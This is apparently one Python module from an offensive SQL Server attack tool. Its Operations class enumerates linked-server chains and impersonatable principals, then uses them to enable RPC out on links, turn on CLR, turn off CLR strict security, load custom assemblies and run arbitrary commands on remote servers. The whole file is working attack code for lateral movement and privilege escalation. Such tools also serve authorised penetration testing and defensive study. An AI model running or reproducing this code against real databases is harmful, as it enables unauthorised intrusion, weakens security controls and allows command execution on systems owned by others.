########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.3.2'
__email__ = ['El3ct71k@gmail.com']

########################################################

import os
import copy
import utilities
from impacket import LOG
from termcolor import colored
from classes import query_builder
from typing import Literal, Any, Union


# TODO: Move all the queries to the Queries file
# TODO: Removes the is_link_in_chain and checks if there are different permissions instead, and if not, dont go in.
# TODO: Review the code
# TODO: Add dynamic bruteforce (Try to brute, and if success, dump the available users and try to brute them)

class Operations(query_builder.QueryBuilder):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, args_options)

        self.use_state = not args_options.no_state
        self.username = user_name
        self.server_address = server_address
        self.port = args_options.port
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{user_name}.state"
        self.max_link_depth = args_options.max_link_depth
        self.max_impersonation_depth = args_options.max_impersonation_depth
        self.auto_yes = args_options.auto_yes
        self.rev2self = dict()
        self.collected_chains = set()

    def connect(self, username: str, password: str, domain: str) -> bool:
        if not utilities.is_port_open(self.server_address, int(self.port), self.options.timeout):
            LOG.info(f"{self.server_address}:{self.port} is closed, skipping.")
            return False
        LOG.info(f"Connecting to {self.server_address}:{self.port} as {username}")
        return super().connect(username, password, domain)

    def get_server_info(self, chain_id):
        if chain_id not in self.state['servers_info'].keys():
            raise Exception(f"Chain id {chain_id} is not in the server state.")
        return self.state['servers_info'][chain_id]

    def clone_chain_id(self, chain_id: str) -> str:
        """
            This function is responsible to clone the chain id.
        """
        new_chain_id = utilities.generate_link_id()
        cloned_chain = copy.deepcopy(self.get_server_info(chain_id))
        cloned = utilities.recursive_replace(cloned_chain, chain_id, new_chain_id)
        cloned['cloned_from'] = new_chain_id
        self.state['servers_info'][new_chain_id] = cloned
        return new_chain_id

    def add_to_server_state(self, chain_id: Union[str, None], key: str, value: Any) -> str:
        """
            This function is responsible to add the server items to the server state.
        """

        if not chain_id:
            chain_id = utilities.generate_link_id()
            self.state['servers_info'][chain_id] = {
                "hostname": "", "chain_str": "", "chain_tree": list(), "db_user": "", "db_name": "", "server_user": "",
                "original_server_user": "", "original_db_user": "", "link_name": "", "instance_name": "", "version": "",
                "domain_name": "", "available_databases": set(), "chain_id": chain_id, "server_principals": set(),
                "database_principals": set(), "server_roles": set(), "database_roles": set(),
                "trustworthy_db_list": set(), "adsi_providers": set(), "walkthrough": list(), "cloned_from": "",
            }
        server_info = self.get_server_info(chain_id)
        if key not in server_info.keys():
            raise Exception(f"Key {key} is not in the server state.")

        server_info_key = server_info[key]

        if isinstance(server_info_key, list) or isinstance(server_info_key, set):
            for v in [value] if not isinstance(value, list) else value:
                if isinstance(server_info_key, list):
                    self.state['servers_info'][chain_id][key].append(v)
                else:
                    self.state['servers_info'][chain_id][key].add(v)

        elif isinstance(server_info_key, dict):
            for k, v in value.items():
                self.state['servers_info'][chain_id][key][k] = v
        else:
            self.state['servers_info'][chain_id][key] = value
        return chain_id

    def filter_server_by_link_name(self, link_name: str) -> list:
        """
            This function is responsible to filter the server by link name.
        """
        discovered_links = utilities.filter_subdict_by_key(self.state['servers_info'], "link_name", link_name)
        if not discovered_links:
            return []

        # Select one in order to just discover the hostname
        link_information = discovered_links[0]
        servers = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
        for server in servers:
            if server['domain_name'] != link_information['domain_name']:
                continue
            yield server

    def generate_authentication_details(self, chain_id: str) -> str:
        """
            This function is responsible to generate authentication details.

            If the server is impersonated, it will show the impersonation details and the original login.
        """
        server_info = self.get_server_info(chain_id)
        original_server_user = server_info['original_server_user']
        server_user = original_server_user if original_server_user else server_info['server_user']

        original_db_user = server_info['original_db_user']
        db_user = original_db_user if original_db_user else server_info['db_user']

        db_name = server_info['db_name']
        for operation_type, operation_value in server_info['walkthrough']:
            if operation_type == 'server':
                server_user += f">{colored('I:', 'red')}{operation_value}"
            elif operation_type == 'database':
                db_user += f">{colored('I:', 'red')}{operation_value}"

        impersonation_details = f"{server_user}@{db_name}/{db_user}"
        return colored(impersonation_details, "cyan")

    def generate_chain_str(self, chain_id: str, print_authentication_details: bool = True) -> str:
        """
            This function is responsible to generates chain string by chain id.
        """
        server_info = self.get_server_info(chain_id)
        if not server_info['chain_tree']:
            chain_str = server_info['hostname']
            if print_authentication_details:
                authentication_details = self.generate_authentication_details(chain_id)
                chain_str += f" ({authentication_details})"
            return chain_str

        chain_str = ""
        for link_name, new_chain_id in server_info['chain_tree']:
            if print_authentication_details:
                authentication_details = self.generate_authentication_details(new_chain_id)
                chain_str += f" -> {colored(link_name, 'green')} ({authentication_details})"
        return chain_str.lstrip(" -> ")

    def is_valid_chain_id(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given chain id is valid.
        """
        if chain_id not in self.state['servers_info']:
            LOG.error(f"Chain id {chain_id} is not in the chain ids list")
            return False

        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Chosen chain: {chain_str} (ID: {chain_id})")
        return True

    def is_valid_link_server(self, link_name: str) -> bool:
        """
            This function is responsible to check if the given linked server is valid.
        """

        filtered_servers = list(self.filter_server_by_link_name(link_name))
        if not filtered_servers:
            LOG.error(f"{link_name} is not in the linked servers list")
            return False
        LOG.info(f"Chosen linked server: {link_name}")
        return True

    def is_same_privileges(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given chain id has the same privileges.
        """
        current_server_info = self.get_server_info(chain_id)
        current_server_user = current_server_info['server_user']
        current_db_user = current_server_info['db_user']

        for server_info in self.filter_server_by_link_name(current_server_info['link_name']):
            if server_info['chain_id'] == chain_id:
                continue
            if server_info['server_user'] == current_server_user and server_info['db_user'] == current_db_user:
                return True
        return False

    def detect_architecture(self, chain_id: str, arch: Literal['autodetect', 'x64', 'x86']) -> Union[str, None]:
        """
            This function is responsible to detect the architecture of a remote server.
        """
        if arch != 'autodetect':
            LOG.info(f"Architecture is set to {arch}")
            return arch

        server_info = self.get_server_info(chain_id)
        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Find architecture in {chain_str}")
        return utilities.detect_architecture(server_info['version'])

    def is_privileged_user(self, chain_id: str, user_type: str) -> bool:
        """
            This function is responsible to check if the given user is privileged.
        """
        if user_type not in ['server', 'database']:
            raise ValueError("User type must be 'server' or 'database'")
        server_info = self.get_server_info(chain_id)
        current_user = server_info['server_user'] if user_type == 'server' else server_info['db_user']
        high_privileged_roles = self.high_privileged_server_roles \
            if user_type == 'server' else self.high_privileged_database_roles

        user_roles = server_info['server_roles'] if user_type == 'server' else server_info['database_roles']

        if current_user in high_privileged_roles:
            return True
        return utilities.is_string_in_lists(user_roles, high_privileged_roles)

    def is_impersonation_depth_exceeded(self, chain_id: str) -> int:
        """
            This function is responsible to check if the impersonation depth is exceeded.
        """
        server_info = self.get_server_info(chain_id)
        counter = 0
        for operation_type, operation_value in server_info['walkthrough']:
            if not operation_value:
                continue
            if operation_type in ['server', 'database']:
                counter += 1
        return counter >= self.max_impersonation_depth

    def retrieve_server_information(self, chain_id: Union[str, None], link_name: Union[str, None]) -> list:
        """
            This function is responsible to retrieve the server information.
        """

        enumeration_results = {
            "server_information": self.get_server_information(chain_id),
            "trustworthy_db_list": self.get_trustworthy_db_list(chain_id),
            "server_roles": self.get_user_roles(chain_id, user_type="server"),
            "database_roles": self.get_user_roles(chain_id, user_type="database"),
            "server_principals": self.get_impersonation_list(chain_id, user_type="server"),
            "database_principals": self.get_impersonation_list(chain_id, user_type="database"),
            "available_databases": self.get_database_list(chain_id)
        }
        chain_str = self.server_address
        if chain_id:
            chain_str = self.generate_chain_str(chain_id, print_authentication_details=False)

        for key in enumeration_results:
            if not enumeration_results[key]['is_success']:
                LOG.error(f"Failed to retrieve server information from {chain_str}")
                del self.state['servers_info'][chain_id]
                return

        db_user = enumeration_results['server_information']['results'][0]['db_user']
        server_user = enumeration_results['server_information']['results'][0]['server_user']
        hostname = utilities.remove_instance_name(enumeration_results['server_information']['results'][0]['hostname'])
        if not link_name:
            LOG.info(f"Discovered hostname: {hostname}")
            self.state['hostname'] = hostname
            chain_id = self.add_to_server_state(chain_id, "hostname", hostname)
            self.add_to_server_state(chain_id, "chain_tree", [[hostname, chain_id]])
            link_name = hostname

        for k, v in {"hostname": hostname, "link_name": link_name, "db_user": db_user, "server_user": server_user,
                     "version": enumeration_results['server_information']['results'][0]['version'],
                     "db_name": enumeration_results['server_information']['results'][0]['db_name'],
                     "domain_name": enumeration_results['server_information']['results'][0]['domain_name'],
                     "instance_name": enumeration_results['server_information']['results'][0]['instance_name']}.items():
            chain_id = self.add_to_server_state(chain_id, k, v)

        chain_str = self.generate_chain_str(chain_id)
        self.add_to_server_state(chain_id, "chain_str", self.generate_chain_str(chain_id))
        if self.is_same_privileges(chain_id):
            LOG.info(f"The privileges of {chain_str} already chained.")
            del self.state['servers_info'][chain_id]
            return

        for key in ["trustworthy_db_list", "available_databases", "server_roles", "database_roles"]:
            for enumeration_dict in enumeration_results[key]['results']:
                for _, enumeration_result in enumeration_dict.items():
                    self.add_to_server_state(chain_id, key, enumeration_result)

        results = list()
        server_info = self.get_server_info(chain_id)
        for key in ["server_principals", "database_principals"]:
            principal_type = "server" if key == "server_principals" else "database"
            for principal_results_dict in enumeration_results[key]['results']:
                for _, principal_results in principal_results_dict.items():
                    if key == "server_principals" and principal_results == server_user:
                        continue

                    if principal_results in server_info[key]:
                        continue
                    LOG.info(f"Discovered {principal_type} principal: {principal_results} on {chain_str}")
                    results.append(principal_results)

            if self.is_privileged_user(chain_id, principal_type):
                privileged_users = self.get_user_list(chain_id, principal_type)
                for principal_user_dict in privileged_users['results']:
                    for _, principal_user in principal_user_dict.items():
                        if principal_user in server_info[key]:
                            continue

                        if principal_type == "server" and principal_user == server_user:
                            continue
                        if principal_type == "database" and principal_user == db_user:
                            continue

                        LOG.info(f"Discovered {principal_type} principal: {principal_user} on {chain_str}")
                        results.append(principal_user)
            self.add_to_server_state(chain_id, key, results)
            results.clear()

        LOG.info(f"Server information from {chain_str} is retrieved")
        yield chain_id

        if self.is_impersonation_depth_exceeded(chain_id):
            LOG.warning(f"Max impersonation depth reached for {chain_str}")
            return

        for key in ["server_principals", "database_principals"]:
            principal_type = "server" if key == "server_principals" else "database"
            for principal in server_info[key]:
                if principal_type == "server" and principal == server_user:
                    continue
                if principal_type == "database" and principal == db_user:
                    continue

                walkthrough = (key.replace("_principals", ""), principal)
                if walkthrough in server_info['walkthrough']:
                    continue

                clone_chain_id = self.clone_chain_id(chain_id)
                self.add_to_server_state(clone_chain_id, "original_server_user", server_user)
                self.add_to_server_state(clone_chain_id, "original_db_user", db_user)
                self.add_to_server_state(clone_chain_id, 'walkthrough', walkthrough)
                yield from self.retrieve_server_information(clone_chain_id, link_name)

    def retrieve_links(self, chain_id: str) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        server_info = self.get_server_info(chain_id)
        chain_str = self.generate_chain_str(chain_id)
        if len(server_info['chain_tree']) > self.max_link_depth:
            LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_link_depth})")
            return

        linkable_servers_results = self.retrieve_linked_server_list(chain_id)
        if not linkable_servers_results['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {chain_str}")
            return

        for row in linkable_servers_results['results']:

            link_name = utilities.remove_instance_name(row['name'])
            if row['provider'].lower() == "adsdsoobject":
                self.add_to_server_state(chain_id, "adsi_providers", link_name)
                continue

            if not row['is_remote_login_enabled']:
                LOG.info(f"Remote login is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc', 'true')
            if not row['is_rpc_out_enabled']:
                LOG.info(f"RPC out is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc out', 'true')

            chain_str = f"{chain_str} -> {link_name}"
            new_chain_id = self.add_to_server_state(None, "link_name", link_name)
            self.add_to_server_state(new_chain_id, "chain_tree",
                                     server_info['chain_tree'] + [[link_name, new_chain_id]])

            for collected_chain_id in self.retrieve_server_information(new_chain_id, link_name):
                collected_server_info = self.get_server_info(collected_chain_id)
                if len(collected_server_info['chain_tree']) > self.max_link_depth:
                    LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_link_depth})")
                    continue

    def retrieve_links_recursive(self) -> None:
        list(self.retrieve_server_information(None, None))

        while True:
            discovered_chains = False
            for server_info in utilities.sort_by_chain_length([v for k, v in self.state['servers_info'].items()]):
                chain_id = server_info['chain_id']
                if chain_id in self.collected_chains:
                    continue
                self.collected_chains.add(chain_id)
                self.retrieve_links(chain_id)
                discovered_chains = True
                break
            if not discovered_chains:
                break
        LOG.info("Done!")

    def direct_query(self, chain_id: str, query: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(chain_id, query, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query} on {self.generate_chain_str(chain_id)}")
            return False

        if not results['results']:
            LOG.info(f"No results found for query: {query} on {self.generate_chain_str(chain_id)}")
            return True

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return True

    def execute_procedure(self, chain_id: str, procedure: str, command: str) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        if not self.is_procedure_accessible(chain_id, procedure):
            return False

        self.reconfigure_procedure(chain_id, "show advanced options", required_status=True)
        self.reconfigure_procedure(chain_id, procedure, required_status=True)

        procedure_results = self.execute_operation(chain_id, "procedure", procedure, command)
        chain_str = self.generate_chain_str(chain_id)
        if not procedure_results['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {chain_str}")
            return False

        LOG.info(f"The {procedure} command executed successfully on {chain_str}")
        if not procedure_results['results']:
            LOG.warning("Failed to resolve the results")
            return True

        for result in procedure_results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, chain_id: str, asm_file_location: str, asm_name: str) -> bool:
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False
        if self.is_assembly_exists(chain_id, asm_name):
            LOG.info(f"{asm_name} assembly is already exists")
            return True

        if not self.reconfigure_procedure(chain_id, 'show advanced options', required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr enabled', required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr strict security', required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False
        return self.add_custom_asm(chain_id, asm_name, asm_file_location)

    def execute_custom_assembly(self, chain_id: str, operation_type: Literal['procedure', 'function'],
                                asm_file_location: str, asm_name: str, operation_name: str, args: str,
                                command: str, wait: bool = True, **kwargs) -> dict:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
            return {"is_success": False}

        server_info = self.get_server_info(chain_id)
        db_user = server_info['db_user']
        if not self.create_operation(chain_id, operation_type, asm_name, operation_name, args, db_user, **kwargs):
            LOG.error(f"Failed to create custom {operation_name}")
            return {"is_success": False}

        execution_results = self.execute_operation(chain_id, operation_type, operation_name, command, wait, db_user)
        if not execution_results['is_success']:
            LOG.error(f"Failed to execute custom {operation_name}")
            return {"is_success": False}
        for result in execution_results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return execution_results

    def add_rev2self_query(self, chain_id: str, query: str, template: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """

        if chain_id not in self.rev2self.keys():
            self.rev2self[chain_id] = []
        self.rev2self[chain_id].append(utilities.replace_strings(template, {"[PAYLOAD]": query}))
